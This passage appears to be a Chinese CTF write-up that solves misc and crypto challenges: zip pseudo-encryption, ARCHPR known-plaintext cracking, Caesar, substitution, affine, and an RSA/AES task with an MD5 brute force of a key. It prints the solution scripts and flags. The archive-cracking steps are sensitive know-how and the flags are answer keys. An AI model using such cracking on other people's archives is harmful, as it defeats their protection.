<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">ss=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> x==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        num=<span class="built_in">int</span>(ss)</span><br><span class="line">        ss=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(num),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss=ss+x;</span><br></pre></td></tr></table></figure></div>

<h3 id="Jigsaw"><a href="#Jigsaw" class="headerlink" title="Jigsaw"></a>Jigsaw</h3><p>给了个7z的文件，显然是压缩包，修改后缀后解压打开会发现一堆零散的图片</p>
<p>费电脑还费眼睛的一道拼图题，不用拼完也能得到flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r00t&#123;NieR_Aut0_mata_2B&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中0和o区分一下就好。</p>
<p>但我还是试着给它拼完了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539285.png"
                     
                ></p>
<p>除了人物主体比较分明，后面的背景真是一眼难尽，本来就高度相近的色调与飘忽的线条，突出一个抽象，不过这背景的真的很美，拼图分开的时候觉得各种割裂，拼在一起以后又觉得意外的和谐，很多地方不放上去比较一下都发现不了可以接在一起，局部色彩相近但整体效果却相当好，各部分拼图的接口处往往都是色彩的分界线，这么小的色彩尺度还能有这么漂亮的效果，只能说画师太牛了。</p>
<h3 id="CAESAR"><a href="#CAESAR" class="headerlink" title="CAESAR"></a>CAESAR</h3><p><em>I came，I saw，I conquered</em></p>
<p>下载下来一个压缩包，如果用7z解压会直接解压出文件，但是会提示文件头错误；如果用别的压缩软件解压会提示输入密码，直接打开压缩包会发现里面的内容没上锁，显然是一个伪加密，进入010editor，会发现里边包了四层PK（zip文件头），好吧真牛，从 <code>50 4B</code> 开始的八个字节都是固定格式的，可以标记为zip的文件格式特点，接下来两个字节是<strong>全局方式位标记</strong>，<code>00 00</code> 表示未加密，可以看到第三层PK的标记是 <code>09 00</code> ，修改后可直接解压。（文件修复后伪加密没了）</p>
<p>发现里面有一个加密的”flag.zip”和tips.txt文件。这次是真加密，提示输入密码，先用ARCHPR试着爆破一下，感觉不太能跑出来的样子；tips提示是”[–(CRC-32)–]”，CRC是一种校验码，可以用来验证文件的完整性与正确性，并且是一种易碰撞的哈希，起到标识文件的作用，但是它无法用于修复文件，如果被加密的flag大小比较小（六字节左右）可以考虑用<strong>CRC碰撞</strong>直接解出flag，但这里的flag长度有22个字节显然不行，恰巧flag.zip里也有tips.txt，那有可能是明文攻击，将tips压缩后得到zip文件，内部的tips文件CRC与flag.zip里的CRC是一样的，说明确实是明文攻击，拖进ARCHPR里分析一下就出来了，直接从包中读取flag就行</p>
<p>题目里的”I saw”指的就是明文攻击吧</p>
<ul>
<li>为了避免ARCHPR报错，压缩tips文件需要尽量用与flag.zip相同的压缩软件或算法，同样是压缩成zip，7z和rar却一个报错一个不报错；</li>
<li>ARCHPR明文攻击条件下，选择文件时先选加密文件会有报错：无法访问xxx文档；加密算法不同会报错：文档不匹配；明文长度小于12会报错：没有足够的数据用于分析（修复前的文件就是六个字节大小的提示，无法进行明文攻击）</li>
</ul>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43625917/article/details/96148661" >Qwzf-zip压缩包的总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/leixiao-/p/9824557.html" >l3yx-破解压缩包的几种方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="旅途中的收获"><a href="#旅途中的收获" class="headerlink" title="旅途中的收获"></a>旅途中的收获</h3><p>密文：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tuqh sqjxo</span><br><span class="line">xuhu yi co auo</span><br><span class="line">squiuh yi jxu aydw ev hecqd ucfyhu</span><br><span class="line"></span><br><span class="line">tuqh sqjxo xuhu yi co auo squiuh yi jxu aydw ev hecqd ucfyhu</span><br></pre></td></tr></table></figure></div>

<p>“Form KS” 和地中海（罗马帝国在地中海沿岸）提示了是凯撒密码，把26个密钥爆破一遍，找出可读的那一串即可：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="built_in">getline</span>(cin,str);</span><br><span class="line">  <span class="type">int</span> i=<span class="number">25</span>;</span><br><span class="line">  <span class="type">int</span> k=str.<span class="built_in">length</span>();</span><br><span class="line">  <span class="keyword">while</span>(i--)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(str[j]==<span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">          str[j]=<span class="built_in">char</span>((str[j]<span class="number">-97</span>+<span class="number">1</span>)%<span class="number">26</span>+<span class="number">97</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      cout&lt;&lt;str&lt;&lt;<span class="string">&quot; key=&quot;</span>&lt;&lt;(<span class="number">25</span>-i)&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>python脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">k=<span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        s1=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">                <span class="keyword">if</span> s[j]==<span class="string">&quot;-&quot;</span> <span class="keyword">or</span> s[j]==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                        s1=s1+s[j]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        s1=s1+<span class="built_in">chr</span>((<span class="built_in">ord</span>(s[j])+i-<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure></div>

<p>得到明文：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dear cathy here is my key caeser is the king of roman empire key=10</span><br></pre></td></tr></table></figure></div>

<p>flag是第三行的内容加下划线分割</p>
<h3 id="来自异乡的演讲稿"><a href="#来自异乡的演讲稿" class="headerlink" title="来自异乡的演讲稿"></a>来自异乡的演讲稿</h3><p>这题目起起伏伏好多遍啊，首先是十九世纪美国的演讲稿，网上找到的可能有两个，一是索琼娜.特鲁斯女士的演讲，一是林肯总统的演讲，根据开头英文单词的数量特点：323721553，可以发现林肯的演讲有一部分是对得上的，将密文与原文对照：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ijv vs gms siugusy ci g umsgo tcqcf vgm, osnociu vrsorsm orgo igocji, jm gix igocji nj </span><br><span class="line">Now we are engaged in a great civil war, testing whether that nation, or any nation so </span><br><span class="line"></span><br><span class="line">tjitscqsygiy nj ysyctgosy, </span><br><span class="line">conceived and so dedicated, </span><br><span class="line"></span><br><span class="line">tgi fjiu siypms. vs gms hso ji g umsgo agoofs-bcsfy jb orgo</span><br><span class="line">can long endure. We are met on a great battle-field of that </span><br><span class="line"></span><br><span class="line">vgm. vs rgqs tjhs oj ysyctgos g kjmocji jb orgo bcsfy, gn g bcigf msnociu kfgts bjm orjns </span><br><span class="line">war. We have come to dedicate a portion of that field, as a final resting place for those </span><br><span class="line"></span><br><span class="line">vrj rsms ugqs orscm fcqsn orgo orgo igocji hcuro fcqs. co cn gfojusorsm bcoociu giy </span><br><span class="line">who here gave their lives that that nation might live. It is altogether fitting and </span><br><span class="line"></span><br><span class="line">kmjksm orgo vs nrjpfy yj orcn.		ors kmjtsnn cn hjms chkjmogio orgi ors msnpfo.</span><br><span class="line">proper that we should do this.		the process is more important than the result</span><br><span class="line"></span><br><span class="line">323721553</span><br></pre></td></tr></table></figure></div>

<p>虽然多了个and，但是无伤大雅，观察会发现密文与明文是一一对应的，所以根据密文对应的明文整理如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-b b-f c-i d-? e-? f-l g-a h-m i-n j-o k-p l-? m-r n-s o-t p-u q-v r-h s-e t-c u-g v-w w-? x-y y-d z-?</span><br></pre></td></tr></table></figure></div>

<p>会发现其中少了几个字母，以及密文相较于林肯的演讲多了一段，将它翻译出来后仔细品一品，再根据提示：flag是26个英文字母，大概可以猜到flag和加密过程有关，而且大概率是加密的字典。起初我以为是维吉尼亚密码，就整理了一下，但是发现一大串都是’f’，觉得不太对，根据二师傅在群里从出题人口中’撬’出来的提示：英文字母无论如何变幻都只有26个，大概能猜出应该是一份一一对应的字典。但起初我只考虑了密文-明文的字典格式，看着那五个对应不上的问号，查了好多好多资料，但没什么头绪。既然只有五个问号，穷举一下也就120种，平台flag每分钟只能交10次，那我罗列所有可能，花十二分钟不就搞定了？</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> j==i :</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> k==j <span class="keyword">or</span> k==i:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> l==k <span class="keyword">or</span> l==j <span class="keyword">or</span> l==i:</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                    <span class="keyword">if</span> m==k <span class="keyword">or</span> m==l <span class="keyword">or</span> m==i <span class="keyword">or</span> m==j:</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;r00t&#123;&#123;bfi&#123;&#125;&#123;&#125;lamnop&#123;&#125;rstuvhecgw&#123;&#125;yd&#123;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(a[i],a[j],a[k],a[l],a[m]))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>使用python3的 <code>.format()</code> 函数时，双写大括号可以转义大括号，例如：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r00t&#123;&#123;&#123;&#125;在哪里?&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"><span class="comment">#输出结果为:r00t&#123;flag在哪里?&#125;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>吐槽一下自己排列组合的程序都有点写不明白了。用该程序跑出的120种flag全都不对。</p>
<p>后来突然想到字典不一定是密文对明文，也可以是明文对密文，恢复的时候前者更便捷，所以让人先入为主的认为字典的模式就是如此，但题目中其实提示要我们找到的是”当时处理文件的方式”，恰巧百度百科中显示替换式密码一般会有一个关键字在前面，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用混合表系统，关键字为“zebras”：</span><br><span class="line">明文为ABCDEFGHIJKLMNOPQRSTUVWXYZ;密文为ZEBRASCDFGHIJKLMNOPQTUVWXY。</span><br><span class="line">明文为：flee at once. we are discovered；加密结果为：SIAA ZQ LKBA. VA ZOA RFPBLUAOAR。</span><br></pre></td></tr></table></figure></div>

<p>显然密文对明文也有类似情况，但这种顺序出现在了中间一段，那么观察一下明文对密文的字典：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-g b-a c-t d-y e-s f-b g-u h-r </span><br><span class="line">i-c j-? k-? l-f m-h n-i o-j p-k q-? r-m s-n t-o u-p v-q w-v x-? y-x z-?</span><br></pre></td></tr></table></figure></div>

<p>排除前半段的特殊字母’gatysbur’，后半段恰好是顺序排列的，于是就可以确定关键字是’gatysbur’（虽然它没有什么特殊含义），后面的依次补上不重复的即可，值得一提的是这里明显看出顺序排列的其实是从 <code>l-f</code> 开始的，也就是说有可能前面的jk也是被归在特殊字符里的，但是一般来说题目会给出唯一解，所以直接恢复出如下字典：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a-g b-a c-t d-y e-s f-b g-u h-r </span><br><span class="line">i-c j-d k-e l-f m-h n-i o-j p-k q-l r-m s-n t-o u-p v-q w-v x-w y-x z-z</span><br></pre></td></tr></table></figure></div>

<p>最后整理一下就得到flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r00t&#123;gatysburcdefhijklmnopqvwxz&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.sohu.com/a/347222362_120065545" >世界史上最著名的十大演讲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_52620919/article/details/119249518" >CTF-古典密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://baike.baidu.com/item/%E6%9B%BF%E6%8D%A2%E5%BC%8F%E5%AF%86%E7%A0%81" >百度百科-替换式密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/lanluyug/article/details/80245220" >拦路雨g-python3中的format函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="物不知其数"><a href="#物不知其数" class="headerlink" title="物不知其数"></a>物不知其数</h3><p>affine（仿射密码）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">今有物不知其数，三三数之剩二，五五数之剩一，七七数之剩四，问物几何？</span><br><span class="line">a=11</span><br><span class="line">ilwzm reowzter nlekrq wc nle repdeinwkz kp mziecnkrc uwctko</span><br><span class="line"></span><br><span class="line">3x+2=5y+1=7z+4</span><br><span class="line"></span><br><span class="line">e(x)=(11x+b) mod 26</span><br><span class="line">d(x)=19(x-b) mod 26</span><br><span class="line"></span><br><span class="line">11x mod 26=1	a&#x27;=19  	</span><br><span class="line">26 52 78 104 130 156 182 208=11*19-1</span><br><span class="line"></span><br><span class="line">8 11 22 25 12</span><br><span class="line"></span><br><span class="line">china reminder theory is the reflection of ancestors wisdom</span><br></pre></td></tr></table></figure></div>

<p>仿射密码的编码函数 <code>e(x)=(ax+b)mod 26</code> 与解码函数 <code>d(x)=a&#39;(x-b) mod 26</code> 中的a与a’互为关于26的乘法逆元，也就是有 <code>(a*a&#39;) mod 26=1</code> ，仿射密码为了保证映射的一一对应，m（在这里是26）需要与a互质，而从编码公式中不难看出b的范围是 <code>[0,25]</code> 。</p>
<p>根据解码公式写一个脚本爆破b得出明文即可：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> c,d;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="built_in">getline</span>(cin,str);</span><br><span class="line">  <span class="type">int</span> i=<span class="number">26</span>;</span><br><span class="line">  <span class="type">int</span> k=str.<span class="built_in">length</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">    string ss=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(str[j]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">        ss=ss+<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> tmp=<span class="number">19</span>*(str[j]<span class="number">-97</span>-i);</span><br><span class="line">      <span class="keyword">while</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        tmp+=<span class="number">26</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ss=ss+<span class="built_in">char</span>((tmp%<span class="number">26</span>)+<span class="number">97</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ss&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>python写的还是没有C++明白…python我不是很清楚字符的编码转换，所以就写了C++。这里值得注意的地方在于减b是不能写成加b来爆破的，直观上关于26取模加减b都是一样轮换的，但实际不是这样，因为前面的系数a’导致加减b的效果并不相同，而很不巧的是C++做不来负数的求余，例如它的 <code>-5 % 26</code> 的结果是-5，所以还需要将中间量转为正数再继续运算。还有个结论：<code>a(x-b) mod 26 = (ax - (ab mod 26)) mod 26</code> 。证明从略。</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_47024013/article/details/118662869" >仿射密码（Affine） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_44033675/article/details/115983293" >1ance.-仿射密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/ISHobbyst/article/details/120094476" >仿射密码原理及例子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="跨越世纪的密码学"><a href="#跨越世纪的密码学" class="headerlink" title="跨越世纪的密码学"></a>跨越世纪的密码学</h3><p>下载下来一个rsa的python程序，需要简单了解一下rsa加密的实现，然后了解一下python如何实现rsa，安装好相关的包后试着根据程序反向找出flag</p>
<p>首先是从环境中插入了flag_e，然后以它作为明文进行rsa公私钥的生成并加密成密文。已知密文c，公钥e，素数乘积n，n的欧拉函数phi，可以用 <code>ed=1 mod phi</code> 得出私钥d，然后 <code>m=c^d mod n</code> 得到明文m，由于在python中输出明文n显示了乱码的具体值：<code>\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</code> ，刚好十二个字节，而密钥少了六个字节的数字字符（这段英文确认了好几遍，是数字的字符），下面的Mode在<a class="link"   href="https://zhuanlan.zhihu.com/p/78913397" >AES <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中有五种，都是三个英文组成的，刚好有六个字节的乱码，我以为这其中有什么转换关系，解码解了两个小时，查了AES无数遍，看了一堆编码，如”unicode”的’utf-8’和’utf-16’与其他编码的关系，python3中bytes类型与str类型的关系与转换，python3默认的编码类型是’UTF-8’，<code>bytes(str,encoding=&#39;utf-8&#39;)</code> 可以转换成字节形式，尝试了将十六进制相互异或得到一字节的数据，python3中只有数字类型可以进行异或运算，字节流也不行，<code>0b1010</code> 表示1010的二进制数字，<code>0xaa</code> 表示aa的十六进制数字，<code>&#39;\xab\xc&#39;</code> 可以便捷的用编码构造字符串，<code>b&#39;xxx&#39;</code> 表示字节类型的字符串数据，<code>f&#39;ab&#123;name&#125;&#39;</code> 快速将name变量的值格式化进字符串中。结果整到最后还是没弄明白有什么联系。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flagenc <span class="keyword">import</span> flag_e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_enc</span>(<span class="params">m</span>):	<span class="comment">#输入明文</span></span><br><span class="line">    p = getPrime(<span class="number">2048</span>)	<span class="comment">#获得2048位的素数</span></span><br><span class="line">    q = getPrime(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    n = p * q	</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = <span class="number">65535</span>	<span class="comment">#公钥</span></span><br><span class="line">  </span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)	<span class="comment">#c=m^e mod n 加密                                             </span></span><br><span class="line">    <span class="keyword">return</span> c,n,phi</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:	<span class="comment">#作为非脚本运行时</span></span><br><span class="line">    m = bytes_to_long(flag_e.encode())	<span class="comment">#flag编码后转换为长整型</span></span><br><span class="line">    c,n,phi = rsa_enc(m)	<span class="comment">#生成密文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n:&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c:&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;phi:&quot;</span>,phi)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#nspan></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=391697005929552889899624830215124682575267078889079201072133494095145759579046066347252915001923189313973278571826223859645184908706427072190715810096762282243880619637348016497361444041933947882850250418927379704657622278598816689855084883059158337921836786317565166049871100026006393993288893058936739439738022130124099305108140743259731160066564274872151968129045918085079143799107277739464655582585781071099212520363988493913082922866099403377300673366747825256467038243192399767164076685852234653970502846413632195424760038541958148380660429785487390583553120274885240552255285089606977744941886013772747881926208782099692077427795179462019605178557106459296546975237531251622042718424305286207681047331067563366960995950636061474397803323838669834764420996419209392870582956326172388319536169644790216185451519917476555609250782848706670945702170334385909547448130814462907972601574007677975767368742231704088242374802664674914635640557841912213450212858885643646516543254448927591662502002704405591678642934442843031804623559824142416740069180900533516164725769842816713265524045088835470803505780159404892637737146146489585446452325219790835092436936741277597038779688278316092540356696242286837477820043838990654446689758405</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phispan></span><br><span class="line"></span><br><span class="line"><span class="comment">#ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58</span></span><br><span class="line"><span class="comment">#Encrypt Method: AES</span></span><br><span class="line"><span class="comment">#Key: 1732050807\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</span></span><br><span class="line"><span class="comment">#	\x67\x3c\xff\x77  \xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf</span></span><br><span class="line"><span class="comment">#	1732050807 89</span></span><br><span class="line"><span class="comment">#IV: 0000000000000000</span></span><br><span class="line"><span class="comment">#Mode: \xc2\xa5  \xc2\xb6  \xc3\x87</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#CFB</span></span><br><span class="line"><span class="comment">#OFB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Notice: key is 16-digits numeric character.</span></span><br><span class="line"><span class="comment">#key&#x27;s md5: 2116f08e96a6f9090e90c13bd28a3d15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&quot;ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58</span></span><br><span class="line"><span class="comment">#Encrypt Method: AES</span></span><br><span class="line"><span class="comment">#Key: 1732050807ª»ÌÝîÿ</span></span><br><span class="line"><span class="comment">#IV: 0000000000000000</span></span><br><span class="line"><span class="comment">#Mode: ¥¶Ç</span></span><br><span class="line"><span class="comment">#Notice: key is 16-digits numeric character.</span></span><br><span class="line"><span class="comment">#key&#x27;s md5: 2116f08e96a6f9090e90c13bd28a3d15</span></span><br><span class="line"><span class="comment">#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1732050807902831</span></span><br></pre></td></tr></table></figure></div>

<p>下方注释的上半段就是一开始思路的笔记，得不出结果，后来想到乱码可能不是线索，它只是模糊了密钥的后六位，不一定用来解码，且只有在python中我可以看到具体的编码，若是以文本显示我是看不到具体的编码数据的，所以应该是被误导了，就调整了思路，将字符串重新整理了一遍，也就是下半段注释内容，会发现key的md5已经给出，已知前10位的情况下只要爆破后6位并比对md5值即可。</p>
<p>用python的hashlib包来写md5的爆破脚本，这里一开始用的update方法爆破不出结果，后来发现update可能是在末尾衔接新的字符串而不是重置，修改写法后就能跑出对应的密钥了</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ending&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> dic:</span><br><span class="line">                        k=hashlib.md5(<span class="string">f&#x27;1732050807<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;f&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                        <span class="keyword">if</span> k.hexdigest() == <span class="string">&#x27;2116f08e96a6f9090e90c13bd28a3d15&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&#x27;1732050807<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;f&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到密钥后解密AES，填充默认即可，偏移为给出的十六个0，由于没给模式需要挨个尝试，注意右下角的编码要选择hex，这个涉及对输入密文的解析，AES算法加密时利用的是位运算，因此最终输入的数据是要经过解析的，这个选项会影响解码的成功与否</p>
<p>解码成功后得到flag（所以跨世纪的密码学到最后也没用上古典密码学）</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310" >百度百科-RSA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
